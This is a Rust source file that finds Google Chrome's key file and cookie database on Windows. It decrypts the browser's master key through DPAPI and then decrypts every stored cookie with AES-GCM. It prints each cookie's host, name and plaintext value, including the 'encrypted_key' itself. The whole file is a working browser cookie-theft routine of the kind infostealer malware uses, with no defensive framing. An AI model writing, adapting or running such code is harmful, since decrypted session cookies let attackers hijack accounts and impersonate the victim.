use std::{env, path::{self, PathBuf}, fs, ptr, fmt, ffi::c_void};
use time::OffsetDateTime;
use cookie::Expiration;
use serde_json;
use sqlite;
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::{Foundation, Security::Cryptography};
use aes_gcm::{Aes256Gcm, Key,aead::{Aead, KeyInit, generic_array::GenericArray}};


struct Cookie {
    host: String,
    path:     String,
	secure:   bool,
	expires:  i64,
	name:     String,
	value:    String,
	http_only: bool,
	same_site: i64
}


impl fmt::Display for Cookie {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Cookie:\n\
             - Host: {}\n\
             - Path: {}\n\
             - Secure: {}\n\
             - Expires: {}\n\
             - Name: {}\n\
             - Value: {}\n\
             - Http Only: {}\n\
             - Same Site: {}",
            self.host, self.path, self.secure, self.expires, self.name, self.value, self.http_only, self.same_site
        )
    }
}

fn find_chrome_paths() -> (PathBuf, PathBuf) {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    let user_data_path = appdata_path.join("../local/Google/Chrome/User Data");
    let key_path = user_data_path.join("Local State");
    let db_path = user_data_path.join("Default/Network/Cookies");
    (key_path, db_path)
}


fn decrypt(keydpapi: &mut [u8]) -> Result<Vec<u8>, String> {
    // https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
    // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localfree
    // https://docs.rs/winapi/latest/winapi/um/dpapi/index.html
    // https://docs.rs/winapi/latest/winapi/um/winbase/fn.LocalFree.html

    let mut data_in = Cryptography::CRYPT_INTEGER_BLOB {
        cbData: keydpapi.len() as u32,
        pbData: keydpapi.as_mut_ptr(),
    };
    let mut data_out = Cryptography::CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: ptr::null_mut()
    };

    unsafe {
        let _ = match Cryptography::CryptUnprotectData(
            &mut data_in,
            Some(ptr::null_mut()),
            Some(ptr::null_mut()),
            Some(ptr::null_mut()),
            Some(ptr::null_mut()),
            0,
            &mut data_out,
        ) {
            Ok(_) => Ok(()),
            Err(_) => Err("CryptUnprotectData failed"),
        };
    }
    if data_out.pbData.is_null() {
        return Err("CryptUnprotectData returned a null pointer".to_string());
    }
    
    let decrypted_data = unsafe {
        std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec()
    };
    let pbdata_hlocal = Foundation::HLOCAL(data_out.pbData as *mut c_void);
    unsafe {
        let _ = match Foundation::LocalFree(pbdata_hlocal) {
            Ok(_) => Ok(()),
            Err(_) => Err("LocalFree failed")
        };
    };
    Ok(decrypted_data)
}

fn get_v10_key(key64: &str) -> Vec<u8> {
    let mut keydpapi: Vec<u8> = general_purpose::STANDARD.decode(&key64).unwrap();
    let keydpapi = &mut keydpapi[5..];
    let v10_key = decrypt(keydpapi).unwrap();
    v10_key
}


fn decrypt_encrypted_value(value: &[u8], key: &[u8]) -> String {
    let value = &value[3..];
    let nonce = &value[..12];
    let ciphertext = &value[12..];

    // Create a new AES block cipher.
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(&key);
    // let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits; unique per message
    let nonce = GenericArray::from_slice(nonce); // 96-bits; unique per message
    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref()).unwrap();
    let plaintext = String::from_utf8(plaintext).unwrap();
    plaintext
}

fn query_cookies(v10_key: Vec<u8>, db_path: PathBuf) {
    let connection = sqlite::open(db_path).unwrap();
    let query = "
        SELECT host_key, path, is_secure, expires_utc, name, value, encrypted_value, is_httponly, samesite
        FROM cookies;
    ";
    for row in connection
    .prepare(query)
    .unwrap()
    .into_iter()
    .map(|row| row.unwrap()) {
        let host_key = row.read::<&str, _>("host_key");
        let path = row.read::<&str, _>("path");
        let is_secure = row.read::<i64, _>("is_secure") != 0;
        let expires_nt_time_epoch = row.read::<i64, _>("expires_utc");
        let name = row.read::<&str, _>("name");
        

        let encrypted_value = row.read::<&[u8], _>("encrypted_value");
        let decrypted_value = decrypt_encrypted_value(encrypted_value, &v10_key);
        let http_only = row.read::<i64, _>("is_httponly") != 0;
        
        let same_site = row.read::<i64, _>("samesite");
        let cookie = Cookie {
            host: host_key.to_string(),
            path: path.to_string(),
            secure: is_secure,
            expires: expires_nt_time_epoch,
            name: name.to_string(),
            value: decrypted_value,
            http_only,
            same_site
        };
        println!("{}", cookie);

    }
}

pub fn get_cookies() {
    let (key, db_path) = find_chrome_paths();
    let content = fs::read_to_string(&key).unwrap();
    let key_dict: serde_json::Value = serde_json::from_str(content.as_str()).expect("Cant read json file");
    let key64 = key_dict.get("os_crypt").unwrap().get("encrypted_key").unwrap().as_str().unwrap();
    println!("{}", key64);
    let v10_key = get_v10_key(key64);
    query_cookies(v10_key, db_path);
}